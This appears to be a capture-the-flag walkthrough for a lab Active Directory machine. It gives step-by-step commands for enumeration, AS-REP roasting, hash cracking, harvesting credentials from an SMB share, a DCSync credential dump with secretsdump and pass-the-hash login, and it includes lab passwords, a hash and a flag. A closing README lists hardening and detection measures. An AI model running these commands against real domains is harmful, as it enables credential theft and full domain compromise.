item.title: AS-REP Roasting
item.description:
#Attacking_Machine #Attacking_Machine
AS-REP Roasting is the technique that enables the attacker to retrieve password hashes for AD users whose account options have been set to "Do not require Kerberos pre-authentication". This option relies on the old Kerberos authentication protocol, which allows authentication without a password. Once we obtain the hashes, we can try to crack it offline, and finally, if it is crackable, we got a password!

lookupsid.py is a tool designed to enumerate Windows Security Identifiers (SIDs) and map them to their corresponding usernames or groups on a remote Windows machine. It facilitates the brute-forcing of SIDs to identify users and groups, which is particularly useful during penetration testing and red teaming exercises.

#Attacking_Machine
The typical command syntax for using lookupsid.py is:
python3 lookupsid.py <domain>/<user>:<password>@<target>
In your case create a file with the ourput:
/usr/share/doc/python3-impacket/examples/lookupsid.py vulnnet-rst.local/guest@<MACHINE IP > lookupsid_output.txt


#Attacking_Machine
Extract the account names (the part after VULNNET-RST\) and put them into users.txt.
sed -n 's/.*\\\(.*\) (SidType.*/\1/p' lookupsid_output.txt > users.txt

Next step: Gaining initial access

item.title: enum4linux-ng
item.description:
#Attacking_Machine
enum4linux-ng is the modern replacement for the classic enum4linux, written in Python and much cleaner + faster. It’s one of the best tools for Active Directory and SMB enumeration on Linux.
#Attacking_Machine
Run the following command:
enum4linux-ng -A <MACHINE IP>
The most interesting information is:

You’ve confirmed the box is exposing LDAP (389), LDAPS (636) and SMB (139/445). Those services give you a lot of enumeration and foothold opportunities.

This gives us useful context. You’ve confirmed the host is a domain member in the vulnnet-rst.local domain with machine WIN-2BO8M1OE1M1. That opens a clear, practical path for AD-focused enumeration and common escalation techniques.

Add the domain to your hosts file on Kali.
sudo nano /etc/hosts
<MACHINE IP> vulnnet-rst.local
Next step: AS-REP Roasting

item.title: Network map
item.description:
Use nmap to see the services and ports on the victim machine.
sudo nmap -sSVC -p- -oA nmap_full -Pn <MACHINE IP>

There are many ports opened, so, you need to do more enumeration.
Next step: enum4linux-ng

item.title: Gaining initial access
item.description:
#Attacking_Machine

#Attacking_Machine
Export AS-REP entries in John format.
/usr/share/doc/python3-impacket/examples/GetNPUsers.py -dc-ip <MACHINE IP> vulnnet-rst.local/ -usersfile users.txt -request -format john -outputfile asreps.john
-request tells the script to request the TGTs.
-format john outputs the hashes in John The Ripper format .
-outputfile writes them to asreps.john.

You specified the IP address of the domain controller with the -dc-ip argument and provided a list of domain users to check against. Once the tool finds the right user with no preauthentication configuration, it will generate the ticket.

Crack the hash with John the Ripper.
john --wordlist=/usr/share/wordlists/rockyou.txt --format=krb5asrep asreps.john

You are now a legitimate Domain User.
User: t-ski
Password: tj072889*
Next step: SMB

item.title: SMB
item.description:
#Attacking_Machine #SMB_Conection #WinRM
#Attacking_Machine

Explore shares with smbclient and the credentials you got on the previous section.
smbclient \\\\<MACHINE IP>\\NETLOGON -U vulnnet-rst.local\\t-skid -U vulnnet-rst.local\\t-skid

After connecting list the files.

#SMB_Conection

Upload to the attacking machine the file ResetPassword.vbs .
smb: \> get ResetPassword.vbs


If you look at the content of ResetPassword.vbs file, you'll find some credentials.
strUserNTName = "a-whitehat"
strPassword = "bNdKVkjv3RR9ht"

See if this user has WinRM rights.
evil-winrm -i <MACHINE IP> -u a-whitehat -p bNdKVkjv3RR9ht

You have access to the machine.

#WinRM
Retrieve information about the currently logged-in Active Directory user**, including the groups they belong to.
Get-ADUser $env:username -Properties MemberOf


Get-ADUser
This cmdlet retrieves a user object from Active Directory.
$env:username
This PowerShell variable contains the username of the currently logged-in user (for example, jdoe).
Properties MemberOf
By default, Get-ADUser only returns a limited set of properties.
The -Properties parameter allows you to request additional attributes — in this case, MemberOf, which lists all the groups the user is a member of.

You can see the user is an Domain Admin.
Next step: User flag

item.title: User flag
item.description:
#WinRM
On WinRM you saw the user Alexa Whitehat is a Domain Admins.
#WinRM
Look for the flag:
Get-ChildItem -Path C:\Users -Include *user.txt* -Recurse | Get-Content


Get-ChildItem -Path C:\Users
Searches the directory C:\Users (and optionally its subdirectories).
-Include *user.txt*
Filters the results to include only files whose names contain user.txt — for example:
user.txt

old_user.txt

myuser.txt.bak

Recurse
Tells PowerShell to search all subdirectories under C:\Users, not just the top-level folder.
| Get-Content
Takes all matching files found by Get-ChildItem and reads their contents.
The output will be the text content of each *user.txt* file, printed to the console.

What is the user flag? (Desktop\user.txt)] THM{726b7c0baaac1455d05c827b5561f4ed}
Next step: DCSync Attack

item.title: DCSync Attack
item.description:
#Attacking_Machine #Attacking_Machine

DCSync is a technique (and legitimate feature) in Active Directory (AD) that allows one domain controller to synchronize (replicate) password data and other account information from another domain controller.
In normal operations, this is how domain controllers keep their data consistent.
However — in offensive security or incident response contexts, “DCSync” usually refers to abusing that replication process to steal credentials.

DCSync = “pretend to be a domain controller and ask another one for all user password hashes.”

In a Windows domain, domain controllers replicate directory information among themselves using the Directory Replication Service (DRS) protocol.
This includes:

User accounts

Group memberships

Password hashes (NTLM, Kerberos keys, etc.)

They use the DS-Replication-Get-Changes and DS-Replication-Get-Changes-All permissions for that.

Attackers who compromise a privileged account (like Domain Admin, Enterprise Admin, or Administrator) can mimic a domain controller and request replication data directly from another DC — without touching the DC’s filesystem.
Tools like:

🧰 Mimikatz (lsadump::dcsync)

🧰 Impacket’s secretsdump.py
can perform this attack.

It allows extraction of:

NTLM password hashes

Kerberos keys (krbtgt)

Password history


With DCSync, an attacker can:

Dump every domain user’s credentials remotely

Forge Golden Tickets (if they obtain the krbtgt hash)

Maintain persistence indefinitely

All without deploying malware on the domain controller itself.

#Attacking_Machine
Run Impacket’s secretsdump.py against <MACHINE IP> using the credentials you Ggo to extract credential material from the target domain controller.
python3 /home/kali/tools/secretsdump.py -just-dc a-whitehat:bNdKVkjv3RR9ht@<MACHINE IP>

python3 .../secretsdump.py — runs the Impacket secretsdump script (used for dumping credentials/secrets).

a-whitehat:bNdKVkjv3RR9ht@<MACHINE IP> — the credentials used to authenticate: username a-whitehat, password bNdKVkjv3RR9ht, and target IP 10.10.92.47.

-just-dc — an option that tells secretsdump to perform actions focused on retrieving domain controller secrets (rather than attempting all possible ways of dumping every local or remote SAM/LSA secret). Practically, this usually means using replication/DRSUAPI or similar methods to obtain domain credentials from a DC.

Depending on the target and the privileges of a-whitehat, secretsdump can:

Use remote APIs (SAMR, LSARPC, DRSUAPI / replication) to extract password material.

Dump NTLM (and sometimes LM) hashes for domain accounts.

Extract Kerberos keys (including the krbtgt account’s key) if available — obtaining krbtgt enables Golden Ticket attacks.

Enumerate account RIDs, SIDs, and sometimes other metadata.

If the supplied account has replication-like privileges (or is a Domain Admin / has DCSync rights), secretsdump can pull a lot of domain account hashes remotely — similar to the DCSync technique.


If a-whitehat is just a normal user without elevated rights, secretsdump -just-dc will likely fail to extract domain hashes.

If a-whitehat is a privileged account (Domain Admin, Enterprise Admin, or any account granted Replicating Directory Changes / Replicating Directory Changes All on the domain), the tool can request replication data and succeed.

On non-DC targets, some techniques may fail; on an actual DC the DRS/replication approaches are most relevant.

The Administrator's info is the most interesting for you.


#Attacking_Machine
Connect with WinRM.
evil-winrm -i <MACHINE IP> -u Administrator -H c2597747aa5e43022a3a3049a3c3b09d

Next step: System flag

item.title: README
item.description:
ASREP-Roasting: accounts marked Do not require Kerberos pre-authentication — these allow attackers to request an AS-REP response that can be cracked offline.

Plaintext credentials (scripts stored on SMB shares) — attackers find passwords in files and escalate.

Exposed SMB / lax share permissions — accessible shares allow enumeration and file downloads.


Nobody should have this flag set except highly controlled service accounts (and even then, avoid it if possible).
PowerShell — list vulnerable accounts:
# list accounts with 'Do not require preauthentication' (flag 0x00400000 = 4194304) Get-ADUser -Filter * -Properties userAccountControl | Where-Object { ($_.userAccountControl -band 4194304) -ne 0 } | Select-Object SamAccountName,UserPrincipalName
PowerShell — disable the flag on a user:
# example: disable on account 't-skid' $u = Get-ADUser t-skid -Properties userAccountControl Set-ADUser t-skid -Replace @{userAccountControl = ($u.userAccountControl -band (-bnot 4194304))}
Recommendation: inventory all accounts with the flag, then remove it en masse or review service accounts individually.



Strong password policy (length, complexity, banned lists).

Require MFA/2FA for privileged accounts.

Rotate service account passwords and rotate the krbtgt account periodically if appropriate.




Search file shares for patterns (password, passwd, pwd, user) in scripts and text files.

# quick example on a Linux file server grep -RIn --exclude-dir={.git,node_modules} -e "password" -e "pwd" /path/to/share_root

Replace embedded credentials with managed identities, gMSAs, or a secrets manager (HashiCorp Vault, Azure Key Vault).

Deploy DLP or automated scanning to catch credentials in files.




Remove anonymous/guest shares; disable guest access.

Apply least-privilege ACLs on shares (only allow read/write to required users).

Enable SMB signing and, where supported, SMB encryption.

Block unnecessary SMB access network-wide with firewalls (don’t expose DCs to general user networks).




Limit WinRM to approved admin hosts.

Ensure LDAP is restricted and use LDAPS where possible; avoid anonymous LDAP queries.

Close RPC/NetBIOS services on perimeter segments unless required.




Audit AD ACLs for who has Replicating Directory Changes and related replication permissions.

Remove overly-broad delegations; use tightly controlled admin groups.

Use BloodHound (internally) to identify risky privilege paths.




Enable advanced Kerberos and Directory Service auditing to log auths and directory access.

Monitor for AS-REP indicators (requests/responses that suggest preauth bypass attempts).

Monitor SMB for unusual activity: mass downloads, access to NETLOGON, SYSVOL, or script directories.

SIEM rules to flag:
Rapid LDAP enumeration activity.

Non-admin accounts accessing script shares.

Use of known enumeration tools (e.g., crackmapexec, rpcclient) from non-admin hosts.

Useful Windows event IDs to correlate: Kerberos events (4768/4769/4770/4771), Directory Service Access (4662), Account Logon (4624/4625). Complement with Sysmon for process/network telemetry.




Place DCs in separate VLANs and strictly control which hosts can reach Kerberos/LDAP/SMB ports.

Use jump hosts for admin tasks; keep management hosts isolated.

Keep Windows Server and DCs patched.




If credentials are found compromised: rotate immediately, force resets, and perform retrospective log review.

Look for persistence: rogue accounts, scheduled tasks, services using compromised credentials.

If krbtgt is exposed or suspected, follow Microsoft’s two-step krbtgt reset process to invalidate Golden Tickets.
